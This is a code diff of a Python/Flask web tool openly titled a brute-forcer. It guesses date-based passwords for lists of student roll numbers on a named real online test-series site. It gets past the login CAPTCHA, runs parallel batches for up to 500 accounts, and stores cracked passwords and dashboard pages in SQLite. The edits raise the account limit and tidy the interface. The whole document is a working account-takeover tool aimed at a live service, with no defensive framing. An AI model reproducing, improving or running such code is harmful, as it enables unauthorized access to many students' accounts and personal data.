@@ -1,13 +1,10 @@
 #!/usr/bin/env python3
 """
-Motion OTS Batch Brute‑Forcer – Ultra‑Fast + 2 Captcha Retries
-Author: Potato (Final Edition)
-
-- Parallel date batches (5 at once per user) with pre‑fetched CAPTCHAs
-- Retry CAPTCHA errors up to 2 additional times (total 3 attempts)
-- No retries for wrong passwords (redirect_failure) → massive speedup
-- Smart success detection (any redirect away from login page)
-- Live logs, SQLite persistence, batch input (commas, newlines, ranges)
+Motion OTS Batch Brute‑Forcer – Complete Reliable Edition
+- No page refresh on start (even with large lists)
+- Live logs for all users simultaneously
+- Smart success detection + 2 CAPTCHA retries
+- Parallel batch processing per user
 """
 
 import os, sys, time, uuid, json, threading, queue, asyncio, aiohttp
@@ -18,14 +15,14 @@ import sqlite3, traceback
 from flask import Flask, render_template_string, request, jsonify, g
 
 # ----------------------------------------------------------------------
-# CONFIGURATION – tune these
+# CONFIGURATION
 # ----------------------------------------------------------------------
-BATCH_SIZE = 5                       # passwords tried in parallel per user
-DELAY_BETWEEN_BATCHES = 0.05         # tiny breath between batches
-MAX_CONCURRENT_USERS = 20            # users running at once
+BATCH_SIZE = 5                       # passwords tried at once per user
+DELAY_BETWEEN_BATCHES = 0.05
+MAX_CONCURRENT_USERS = 20
 CAPTCHA_FETCH_TIMEOUT = 5
 LOGIN_TIMEOUT = 10
-CAPTCHA_RETRIES = 2                  # extra retries for captcha errors (total 3 attempts)
+CAPTCHA_RETRIES = 2                  # extra attempts for captcha errors (total 3)
 CAPTCHA_PREPROCESS = True
 
 # ----------------------------------------------------------------------
@@ -224,11 +221,11 @@ class BruteJob:
                     break
                 batch_dates = dates[i:i+BATCH_SIZE]
 
-                # 1. Fetch all CAPTCHAs for the batch concurrently
+                # Fetch CAPTCHAs concurrently
                 captcha_tasks = [self._fetch_captcha(session, log_queue) for _ in batch_dates]
                 captchas = await asyncio.gather(*captcha_tasks, return_exceptions=True)
 
-                # 2. Launch login attempts in parallel
+                # Launch logins concurrently
                 login_tasks = []
                 for j, date in enumerate(batch_dates):
                     captcha = captchas[j] if not isinstance(captchas[j], Exception) else None
@@ -237,19 +234,14 @@ class BruteJob:
                         self._try_one_password(session, user_id, password, captcha, log_queue)
                     )
 
-                # 3. Wait for the first success or all finished
-                done, pending = await asyncio.wait(
-                    login_tasks,
-                    return_when=asyncio.FIRST_COMPLETED
-                )
+                # Wait for first success
+                done, pending = await asyncio.wait(login_tasks, return_when=asyncio.FIRST_COMPLETED)
 
-                # Check if any succeeded
                 found = False
                 for task in done:
                     try:
                         if task.result():
                             found = True
-                            # Cancel all remaining tasks
                             for p in pending:
                                 p.cancel()
                             break
@@ -257,38 +249,32 @@ class BruteJob:
                         pass
 
                 if found:
-                    # Success already saved inside _try_one_password
-                    return  # stop this user
+                    return  # success already handled inside _try_one_password
 
-                # If no success yet, wait for the rest (clean up)
+                # Wait for the rest to finish (clean up)
                 if pending:
                     await asyncio.gather(*pending, return_exceptions=True)
 
-                # Progress
+                # Update progress
                 processed = min(i + BATCH_SIZE, total)
                 self.user_progress[user_id]['processed'] = processed
-                log_queue.put_nowait(
-                    f"📊 [{user_id}] Progress: {processed}/{total} ({processed/total*100:.1f}%)"
-                )
+                if processed % (BATCH_SIZE * 5) == 0 or processed == total:
+                    log_queue.put_nowait(
+                        f"📊 [{user_id}] Progress: {processed}/{total} ({processed/total*100:.1f}%)"
+                    )
 
                 await asyncio.sleep(DELAY_BETWEEN_BATCHES)
 
-            # No password found
             self.results[user_id] = None
             log_queue.put_nowait(f"❌ [{user_id}] No password found in {year}.")
             self.save_to_db()
 
     async def _try_one_password(self, session, user_id, password, initial_captcha, log_queue):
-        """
-        Attempt login with given password.
-        Retry only CAPTCHA errors / timeouts (up to CAPTCHA_RETRIES extra attempts).
-        Returns True if success, False otherwise.
-        """
         captcha = initial_captcha
         if not captcha:
             captcha = await self._fetch_captcha(session, log_queue)
 
-        for attempt in range(CAPTCHA_RETRIES + 1):   # total attempts = 1 + CAPTCHA_RETRIES
+        for attempt in range(CAPTCHA_RETRIES + 1):
             if self.stop_flag:
                 return False
             if not captcha:
@@ -300,7 +286,6 @@ class BruteJob:
                 if success:
                     log_queue.put_nowait(f"✅ [{user_id}] SUCCESS! Password = {password}")
                     self.results[user_id] = password
-                    # Save dashboard (optional)
                     try:
                         dash = await session.get(
                             "https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php"
@@ -313,15 +298,14 @@ class BruteJob:
                     self.save_to_db()
                     return True
 
-                # Only retry for captcha errors or timeouts
                 if reason in ("captcha_error", "timeout"):
                     if attempt < CAPTCHA_RETRIES:
                         log_queue.put_nowait(f"🔄 [{user_id}] {reason} – retry {attempt+1}/{CAPTCHA_RETRIES}")
                         captcha = await self._fetch_captcha(session, log_queue)
                         await asyncio.sleep(0.2)
                         continue
-                # Any other failure → give up immediately
-                log_queue.put_nowait(f"❌ [{user_id}] {password} failed: {reason[:100]}")
+                # Any other failure → stop retrying this password
+                log_queue.put_nowait(f"❌ [{user_id}] {password} failed: {reason[:80]}")
                 break
             except asyncio.TimeoutError:
                 log_queue.put_nowait(f"⏰ [{user_id}] Timeout – retry {attempt+1}/{CAPTCHA_RETRIES}")
@@ -358,7 +342,6 @@ class BruteJob:
         return None
 
     async def _try_login(self, session, user_id, password, captcha, log_queue):
-        """Smart success detection: any redirect not to login/captcha is success."""
         data = {
             "login_username": user_id,
             "login_password": password,
@@ -390,7 +373,7 @@ class BruteJob:
                             text = await dash_resp.text()
                             if "dashboard" in text.lower() or "logout" in text.lower():
                                 return True, None
-                            return True, None  # still treat as success
+                            return True, None
                     except:
                         return True, None
                 elif resp.status == 200:
@@ -459,16 +442,16 @@ def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Motion Ultra‑Fast Brute‑Force</title>
+    <title>Motion Batch Brute‑Force</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
         .container { max-width: 1100px; margin: auto; }
         .card { background: #161b22; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
         h1 { color: #58a6ff; }
-        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
+        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: flex-start; }
         .form-group label { font-weight: bold; min-width: 80px; }
-        .form-group input, .form-group textarea { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 200px; }
-        .form-group textarea { resize: vertical; min-height: 100px; }
+        .form-group textarea, .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 200px; }
+        .form-group textarea { resize: vertical; min-height: 120px; }
         .btn { padding: 10px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
         .btn-start { background: #238636; color: #fff; }
         .btn-stop { background: #da3633; color: #fff; }
@@ -494,12 +477,12 @@ def index():
 <div class="container">
     <div class="card">
         <h1>⚡ Motion OTS Ultra‑Fast Batch Brute‑Forcer</h1>
-        <p>Paste roll numbers (one per line, commas, or ranges) and year. 5 dates tested at once, instant skip of wrong passwords, 2 retries only for captcha errors.</p>
-        <p class="help-text">🚀 Full year under 1 minute per user – 20 users run simultaneously.</p>
-        <form id="bruteForm">
+        <p>Paste roll numbers (one per line, commas, or ranges) and a year. No page refresh, live logs for all users.</p>
+        <p class="help-text">🚀 5 dates at once, 2 captcha retries, 20 users parallel. Wrong passwords skipped instantly.</p>
+        <form id="bruteForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="user_ids">User IDs</label>
-                <textarea id="user_ids" placeholder="Paste roll numbers here (one per line, comma separated, or range like 26173000001-26173000100)"></textarea>
+                <textarea id="user_ids" placeholder="26173000177&#10;26173000179&#10;..."></textarea>
             </div>
             <div class="form-group">
                 <label for="year">Year</label>
@@ -522,6 +505,12 @@ def index():
     </div>
 </div>
 <script>
+    // Safety: stop form from ever refreshing the page
+    document.getElementById('bruteForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        startJob();
+    });
+
     let jobId = null;
     let pollInterval = null;
     const logsDiv = document.getElementById('logs');
@@ -531,10 +520,10 @@ def index():
     const stopBtn = document.getElementById('stopBtn');
     const jobListDiv = document.getElementById('jobList');
 
-    // Multi‑delimiter parser: newlines, commas, semicolons, and ranges
     function parseUserIds(raw) {
         const ids = new Set();
-        const parts = raw.split(/[\n,;]+/);
+        // split by newline, comma, semicolon, or space (trim each part)
+        const parts = raw.split(/[\n,; ]+/);
         for (let part of parts) {
             part = part.trim();
             if (part === '') continue;
@@ -552,42 +541,64 @@ def index():
         return Array.from(ids);
     }
 
-    document.getElementById('bruteForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
+    async function startJob() {
         const rawIds = document.getElementById('user_ids').value.trim();
         const year = document.getElementById('year').value.trim();
-        if (!rawIds || !year) return alert('Please fill all fields.');
+        if (!rawIds || !year) {
+            alert('Please fill all fields.');
+            return;
+        }
         const user_ids = parseUserIds(rawIds);
-        if (user_ids.length === 0) return alert('No valid IDs found.');
-        if (user_ids.length > 100) return alert('Maximum 100 IDs allowed.');
+        if (user_ids.length === 0) {
+            alert('No valid user IDs found.');
+            return;
+        }
+        if (user_ids.length > 500) {
+            alert('Maximum 500 IDs allowed.');
+            return;
+        }
+
         startBtn.disabled = true;
         stopBtn.disabled = false;
         logsDiv.innerHTML = '';
         statusText.innerText = 'Starting...';
         passwordResult.innerText = '';
+
         const formData = new FormData();
         formData.append('user_ids', JSON.stringify(user_ids));
         formData.append('year', year);
+
         try {
             const resp = await fetch('/start', { method: 'POST', body: formData });
             const data = await resp.json();
-            if (data.error) { alert(data.error); resetUI(); return; }
+            if (data.error) {
+                alert(data.error);
+                resetUI();
+                return;
+            }
             jobId = data.job_id;
             statusText.innerText = 'Running...';
             if (pollInterval) clearInterval(pollInterval);
             pollInterval = setInterval(pollStatus, 1500);
             loadJobs();
-        } catch (err) { alert('Error: ' + err.message); resetUI(); }
-    });
+        } catch (err) {
+            alert('Error starting job: ' + err.message);
+            resetUI();
+        }
+    }
 
     stopBtn.addEventListener('click', async () => {
         if (!jobId) return;
         try {
             await fetch(`/stop/${jobId}`, { method: 'POST' });
             statusText.innerText = 'Stopped';
-            stopBtn.disabled = true; startBtn.disabled = false;
-            clearInterval(pollInterval); loadJobs();
-        } catch (err) { alert('Stop error: ' + err.message); }
+            stopBtn.disabled = true;
+            startBtn.disabled = false;
+            clearInterval(pollInterval);
+            loadJobs();
+        } catch (err) {
+            alert('Stop error: ' + err.message);
+        }
     });
 
     async function pollStatus() {
@@ -595,7 +606,11 @@ def index():
         try {
             const resp = await fetch(`/status/${jobId}`);
             const data = await resp.json();
-            if (data.error) { clearInterval(pollInterval); resetUI(); return; }
+            if (data.error) {
+                clearInterval(pollInterval);
+                resetUI();
+                return;
+            }
             if (data.new_logs && data.new_logs.length > 0) {
                 data.new_logs.forEach(msg => {
                     const div = document.createElement('div');
@@ -605,8 +620,8 @@ def index():
                     else div.classList.add('info');
                     div.textContent = msg;
                     logsDiv.appendChild(div);
-                    logsDiv.scrollTop = logsDiv.scrollHeight;
                 });
+                logsDiv.scrollTop = logsDiv.scrollHeight;  // auto-scroll
             }
             if (data.status === 'success') {
                 statusText.innerText = '✅ Completed';
@@ -629,7 +644,9 @@ def index():
                 }
                 passwordResult.innerHTML = res;
             }
-        } catch (err) { console.error('Poll error:', err); }
+        } catch (err) {
+            console.error('Poll error:', err);
+        }
     }
 
     async function loadJobs() {
@@ -705,8 +722,8 @@ def start_job():
         year = int(year)
     except:
         return jsonify({'error': 'Year must be integer'}), 400
-    if len(user_ids) > 100:
-        return jsonify({'error': 'Maximum 100 user IDs allowed'}), 400
+    if len(user_ids) > 500:
+        return jsonify({'error': 'Maximum 500 user IDs allowed'}), 400
 
     job_id = str(uuid.uuid4())
     job = BruteJob(job_id, user_ids, year)
